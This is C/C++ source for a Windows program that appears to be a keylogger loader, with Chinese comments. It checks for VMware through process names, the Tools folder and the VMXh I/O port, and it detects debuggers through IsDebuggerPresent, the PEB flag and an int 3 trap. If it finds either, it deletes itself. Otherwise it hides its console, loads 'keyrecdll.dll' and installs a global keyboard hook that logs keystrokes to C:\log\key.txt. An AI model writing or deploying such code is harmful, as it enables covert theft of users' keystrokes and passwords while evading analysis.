#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h> 
#include <tchar.h>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <shlwapi.h>
#pragma   comment(lib,"shlwapi.lib")
#include <tlhelp32.h>

/*
如果修改如下信息，需要重新编译：
    锁定程序文件名
    记录文件路径
    dll文件名
*/

HANDLE hDesProcess = NULL;

bool AdjustProcessTokenPrivilege() {
    LUID luidTmp;
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("AdjustProcessTokenPrivilege OpenProcessToken Failed ! \n");
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidTmp)) {
        printf("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! \n");
        CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luidTmp;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        printf("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! \n");
        CloseHandle(hToken);
        return FALSE;
    }
    return true;
}

void delself(){
    char Filename[256];
    char Parameters[256];

    GetModuleFileNameA(0, Filename, 256);
    GetShortPathNameA(Filename, Filename, 256);
    strcpy(Parameters, "/c del ");
    strcat(Parameters, Filename);
    strcat(Parameters, " >> NUL");
    printf("del?\n");
    system("pause");
    ShellExecuteA(0, 0, "cmd.exe", Parameters, 0, 0);
    exit(-1);
}

DWORD FindProcess(LPCTSTR ProcessName){
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD dwThreadId = 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    BOOL fOk;
    for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe)){
        if (!_tcscmp(pe.szExeFile, ProcessName)){
            // printf("Succeed: Get Thread ID: %ld\n",pe.th32ProcessID);
            dwThreadId = pe.th32ProcessID;
        }
    
    }
    CloseHandle(hSnapshot);
    // if (dwThreadId = 0)
    //     printf("Error: Thread ID not found.\n");
    return dwThreadId;
}

bool DetectVM(){
    bool is_VM = false;
    //查看当前运行的进程
    if(FindProcess((LPCTSTR)"vmtoolsd.exe") || FindProcess((LPCTSTR)"vmacthlp.exe")){
        printf("Find VM process\n");
        is_VM |= true;
    }

    //查看vmtool程序路径
    if(PathIsDirectory((LPCTSTR)"C:\\Program Files\\VMware\\VMware Tools\\")){
        printf("Find VMtool folder\n");
        is_VM |= true;
    }

    //in
    ULONG VM_ver = 0;
    __try{
        __asm{
            push   edx
            push   ecx
            push   ebx 
            mov    eax, 'VMXh'
            mov    ebx, 0   //用于存放VMware所有响应的内存地址
            mov    ecx, 0xa //获取VMware版本，若为0x14则get the memory size
            mov    edx, 'VX'//为in指令指定VMware I/O通信端口
            in     eax, dx 
            cmp    ebx, 'VMXh' 
            setz   [is_VM] 
            mov    [VM_ver], ecx
            pop    ebx
            pop    ecx
            pop    edx
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER){
        is_VM |= false;
    }
    if(is_VM){
        printf("I/O works\n");
        is_VM |= true;
    }

    return is_VM;

    // No Pill
/*     ULONG xdt = 0 ;
    ULONG InVM = 0;
    __asm{
        push edx
        sidt [esp-2]
        pop edx
        nop
        mov xdt , edx
    }
    if (xdt > 0xd0000000){
        InVM = 1;
    }
    else{
        InVM = 0;
    }
    __asm{
        push edx
        sgdt [esp-2]
        pop edx
        nop
        mov xdt , edx
    }
    if(xdt > 0xd0000000){
        InVM += 1;
    }
    if(InVM == 0){
        return FALSE;
    }
    else{
        printf("No Pills work\n");
        return TRUE;
    } */

    // str
    /* unsigned char mem[4] = {0};
    __asm str mem;
    printf("%s\n", mem);
    if ((mem[0] == 0x00) && (mem[1] == 0x40)){
        printf("str works\n");
        return TRUE;
    }
    else{
        return FALSE;
    } */
}

bool DetectDebug(){
    bool is_Debug = 0;
    //Win API
    if(IsDebuggerPresent()){
        printf("IsDebuggerPresent\n");
        is_Debug |= true;
    }
    
    //PEB
    __asm{
        mov eax, fs:[30h]
        mov al, BYTE PTR [eax + 2] 
        mov is_Debug, al
    }
    if(is_Debug){
        printf("PEB BeingDebugged set\n");
        is_Debug |= true;
    }

    // int 3
    /* __asm{
        push offset continue
        push DWORD ptr fs:[0]
        mov  fs:[0], esp
        int  3
        mov  eax, 0xffffffff
        push lpszProcessName
        call printf
        jmp  eax
    continue:
        //mov  [is_Debug], 0

    } */

    __try{
        __asm int 3
    }
    __except(1){
        return is_Debug | false;
    }
    is_Debug |= true;


    return is_Debug;
}

int main(int argc, char *argv[]){
    printf("Start\n");
    //虚拟机检测
    if(DetectVM() == true){
        printf("running in VM, exiting\n");
        delself();
    }

    //调试过程检测
    if(DetectDebug() == true){
        printf("running under debug mode\n");
        delself();
    }
    
    //隐藏cmd窗口
    ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);

    //提权
    //AdjustProcessTokenPrivilege();

    //读取DLL及其中的函数
    HMODULE hMod = LoadLibraryA("keyrecdll.dll");
    if(!hMod){
        printf("Load DLL fail");
        return 1;
    }
    
    DWORD lpFunc = (DWORD)GetProcAddress(hMod, "?MyHook@@YGJHIJ@Z");
    if(!lpFunc){
        if(hMod) 
            FreeLibrary(hMod);
        printf("Error: Load DLL function FAIL!\n");
        return 1;
    }
    
    

    HHOOK hhook = SetWindowsHookEx(
    WH_KEYBOARD,//WH_KEYBOARD,//WH_CALLWNDPROC,
    (HOOKPROC)lpFunc,
    hMod,
    0);//此处输入线程标识符，若为0则捕获全局键盘消息
    
    if(hhook == 0){
        printf("Hook Fail\n");
        return 1;
    }
    else
        printf("Hook Sueecss!\n Output: C:\\log\\key.txt");

    MSG msg;
    while(1){
        if (PeekMessageA(&msg, 0, 0, 0, PM_REMOVE)){
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        else
            Sleep(0);
    }
    
    return 0;
}

